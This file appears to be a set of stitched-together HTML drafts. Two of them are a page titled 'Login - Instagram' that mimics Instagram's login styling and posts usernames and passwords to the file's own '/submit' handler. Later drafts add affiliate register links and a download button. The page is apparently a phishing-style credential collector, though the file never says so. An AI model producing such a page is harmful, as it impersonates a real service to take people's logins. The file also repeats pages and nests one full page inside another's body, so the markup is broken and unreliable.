<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram</title>
    <style>
        /* Basic reset and body styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: black;  /* Changed background to black */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;  /* Set text color to white to contrast against the black background */
        }

        /* Main container */
        .login-container {
            width: 350px;
            padding: 30px;
            background-color: white;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            text-align: center;
        }

        /* Instagram logo */
        .logo img {
            width: 150px;
            margin-bottom: 20px;
        }

        /* Input fields */
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px;
        }

        /* Button style */
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;  /* Instagram blue */
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }

        /* Green hover effect for the login button */
        button:hover {
            background-color: green;  /* Change background to green on hover */
        }

        /* Footer link styles */
        .footer {
            margin-top: 20px;
        }

        .footer a {
            font-size: 12px;
            color: #8e8e8e;  /* Default link color */
            text-decoration: none;
        }

        /* Red hover effect for the link */
        .footer a:hover {
            color: red;  /* Change text color to red when hovered */
            text-decoration: underline;
        }

        /* Optional: Add a little margin for smaller devices */
        @media (max-width: 400px) {
            .login-container {
                width: 90%;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Instagram logo -->
        <div class="logo">
            <!-- Add Instagram logo image URL here -->
        </div>
        
        <!-- Login Form -->
        <form action="/submit" method="post">
            <input type="text" name="username" placeholder="Phone, email, or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>

        <!-- Forgot Password Link -->
        <div class="footer">
            <a href="password-reset.html">Forgot password?</a>
        </div>
    </div>

</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram</title>
    <style>
        /* Basic reset and body styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: black;  /* Changed background to black */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;  /* Set text color to white to contrast against the black background */
        }

        /* Main container */
        .login-container {
            width: 350px;
            padding: 30px;
            background-color: white;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            text-align: center;
        }

        /* Instagram logo */
        .logo img {
            width: 150px;
            margin-bottom: 20px;
        }

        /* Input fields */
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px;
        }

        /* Button style */
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;  /* Instagram blue */
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }

        /* Green hover effect for the login button */
        button:hover {
            background-color: green;  /* Change background to green on hover */
        }

        /* Footer link styles */
        .footer {
            margin-top: 20px;
        }

        .footer a {
            font-size: 12px;
            color: #8e8e8e;  /* Default link color */
            text-decoration: none;
        }

        /* Red hover effect for the link */
        .footer a:hover {
            color: red;  /* Change text color to red when hovered */
            text-decoration: underline;
        }

        /* Optional: Add a little margin for smaller devices */
        @media (max-width: 400px) {
            .login-container {
                width: 90%;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Instagram logo -->
        <div class="logo">
            <!-- Add Instagram logo image URL here -->
        </div>
        
        <!-- Login Form -->
        <form action="/submit" method="post">
            <input type="text" name="username" placeholder="Phone, email, or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>

        <!-- Forgot Password Link -->
        <div class="footer">
            <a href="password-reset.html">Forgot password?</a>
        </div>
    </div>

</body>
</html><!DOCTYPE html>









<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Top Bar with Download Button</title>
    <style>
        /* Basic reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            padding-top: 50px; /* To make sure the content is not hidden behind the top bar */
        }

        /* Top bar styles */
        .top-bar {
            background-color: #808080; /* Grey background */
            color: white;
            height: 50px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 1000;
        }

        /* Button styles */
        .download-btn {
            background-color: #007bff; /* Blue background */
            color: white;
            border: none;
            padding: 3px 8px; /* Smaller padding */
            cursor: pointer;
            border-radius: 15px; /* Rounded corners */
            font-size: 12px; /* Smaller font size */
            text-transform: uppercase;
            white-space: nowrap; /* Prevents text from wrapping */
            position: absolute;
            top: 50%; /* Vertically center the button */
            right: 20px; /* Position the button to the right */
            transform: translateY(-50%); /* Correct the vertical alignment */
        }

        /* Button hover effect */
        .download-btn:hover {
            background-color: #28a745; /* Green background on hover */
        }
    </style>
</head>
<body>

    <!-- Top bar with download button -->
    <div class="top-bar">
        <span>Some Title</span>
        <button class="download-btn" onclick="window.location.href='https://www.example.com/download'">Download</button>
    </div>

</body>
</html>











<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Affiliate Link with Register Hover</title>
    <style>
        /* Basic reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }

        /* Style for the affiliate link text */
        .affiliate-link {
            font-size: 16px;
        }

        /* Style for the "Need an account?" text */
        .need-account {
            color: grey; /* Grey color for "Need an account?" */
        }

        /* Style for the "Register" text */
        .register {
            color: blue; /* Blue color for "Register" */
            text-decoration: none; /* Remove underline */
        }

        /* Hover effect for the "Register" text */
        .register:hover {
            color: green; /* Green color when hovered */
        }
    </style>
</head>
<body>

    <!-- Affiliate Link Section -->
    <div class="affiliate-link">
        <span class="need-account">Need an account? </span>
        <a href="https://www.example.com/register" class="register">Register</a>
    </div>

</body>
</html>





<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Affiliate Link with Register Hover</title>
    <style>
        /* Basic reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }

        /* Style for the login container */
        .login-container {
            width: 350px;
            padding: 30px;
            background-color: white;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            text-align: center;
            margin-top: 20px;
        }

        /* Forgot password link styles */
        .footer {
            margin-top: 20px;
        }

        .footer a {
            font-size: 12px;
            color: #8e8e8e;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Box for the "Need an account? Register" link */
        .affiliate-box {
            margin-top: 20px;
            padding: 15px;
            background-color: #f1f1f1;
            border-radius: 5px;
            border: 1px solid #dbdbdb;
            text-align: center;
        }

        /* Style for the affiliate link text */
        .affiliate-link {
            font-size: 14px;
        }

        /* Style for the "Need an account?" text */
        .need-account {
            color: grey; /* Grey color for "Need an account?" */
        }

        /* Style for the "Register" text */
        .register {
            color: blue; /* Blue color for "Register" */
            text-decoration: none; /* Remove underline */
        }

        /* Hover effect for the "Register" text */
        .register:hover {
            color: green; /* Green color when hovered */
        }
    </style>
</head>
<body>

    <!-- Login Container -->
    <div class="login-container">
        <form action="/submit" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>

        <!-- Forgot Password Link -->
        <div class="footer">
            <a href="#">Forgot password?</a>
        </div>

        <!-- Existing Box for "Need an account? Register" link -->
        <div class="affiliate-box">
            <div class="affiliate-link">
                <span class="need-account">Need an account? </span>
                <a href="https://www.example.com/register" class="register">Register</a>
            </div>
        </div>
    </div>

</body>
</html>








<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Affiliate Link with Register Hover</title>
    <style>
        /* Basic reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }

        /* Style for the login container */
        .login-container {
            width: 350px;
            padding: 30px;
            background-color: white;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            text-align: center;
            margin-top: 20px;
        }

        /* Box for the "Forgot password?" link */
        .forgot-password-box {
            margin-top: 20px;
            padding: 15px;
            background-color: #f1f1f1;
            border-radius: 5px;
            border: 1px solid #dbdbdb;
            text-align: center;
        }

        /* Box for the "Need an account? Register" link */
        .affiliate-box {
            margin-top: 20px;
            padding: 15px;
            background-color: #f1f1f1;
            border-radius: 5px;
            border: 1px solid #dbdbdb;
            text-align: center;
        }

        /* Style for the link text */
        .affiliate-link, .forgot-password-link {
            font-size: 14px;
        }

        /* Style for the "Need an account?" text */
        .need-account {
            color: grey; /* Grey color for "Need an account?" */
        }

        /* Style for the "Register" text */
        .register {
            color: blue; /* Blue color for "Register" */
            text-decoration: none; /* Remove underline */
        }

        /* Hover effect for the "Register" text */
        .register:hover {
            color: green; /* Green color when hovered */
        }

        /* Style for the "Forgot password?" text */
        .forgot-password {
            color: grey; /* Grey color for "Forgot password?" */
        }

        /* Hover effect for the "Forgot password?" text */
        .forgot-password:hover {
            text-decoration: underline; /* Underline when hovered */
            color: green; /* Green color on hover */
        }
    </style>
</head>
<body>

    <!-- Login Container -->
    <div class="login-container">
        <form action="/submit" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>

        <!-- Forgot Password Box -->
        <div class="forgot-password-box">
            <div class="forgot-password-link">
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
        </div>

        <!-- Existing Box for "Need an account? Register" link -->
        <div class="affiliate-box">
            <div class="affiliate-link">
                <span class="need-account">Need an account? </span>
                <a href="https://www.example.com/register" class="register">Register</a>
            </div>
        </div>
    </div>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Affiliate Link with Register Hover</title>
        <style>
            /* Basic reset */
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
    
            body {
                font-family: Arial, sans-serif;
                padding: 20px;
            }
    
            /* Style for the login container */
            .login-container {
                width: 350px;
                padding: 30px;
                background-color: white;
                box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
                border-radius: 5px;
                text-align: center;
                margin-top: 20px;
            }
    
            /* Box for the "Forgot password?" link */
            .forgot-password-box {
                margin-top: 20px;
                padding: 15px;
                background-color: #f1f1f1;
                border-radius: 5px;
                border: 1px solid #dbdbdb;
                text-align: center;
            }
    
            /* Box for the "Need an account? Register" link */
            .affiliate-box {
                margin-top: 20px;
                padding: 15px;
                background-color: #f1f1f1;
                border-radius: 5px;
                border: 1px solid #dbdbdb;
                text-align: center;
            }
    
            /* Style for the link text */
            .affiliate-link, .forgot-password-link {
                font-size: 14px;
            }
    
            /* Style for the "Need an account?" text */
            .need-account {
                color: grey; /* Grey color for "Need an account?" */
            }
    
            /* Style for the "Register" text */
            .register {
                color: blue; /* Blue color for "Register" */
                text-decoration: none; /* Remove underline */
            }
    
            /* Hover effect for the "Register" text */
            .register:hover {
                color: green; /* Green color when hovered */
            }
    
            /* Style for the "Forgot password?" text */
            .forgot-password {
                color: grey; /* Default grey color for "Forgot password?" */
                transition: color 0.3s, text-decoration 0.3s; /* Smooth transition */
            }
    
            /* Hover effect for the "Forgot password?" text */
            .forgot-password:hover {
                color: red; /* Red color on hover */
                text-decoration: underline; /* Underline when hovered */
            }
        </style>
    </head>
    <body>
    
        <!-- Login Container -->
        <div class="login-container">
            <form action="/submit" method="post">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
    
            <!-- Forgot Password Box -->
            <div class="forgot-password-box">
                <div class="forgot-password-link">
                    <a href="#" class="forgot-password">Forgot password?</a>
                </div>
            </div>
    
            <!-- Existing Box for "Need an account? Register" link -->
            <div class="affiliate-box">
                <div class="affiliate-link">
                    <span class="need-account">Need an account? </span>
                    <a href="https://www.example.com/register" class="register">Register</a>
                </div>
            </div>
        </div>
    
    </body>
    </html>
    
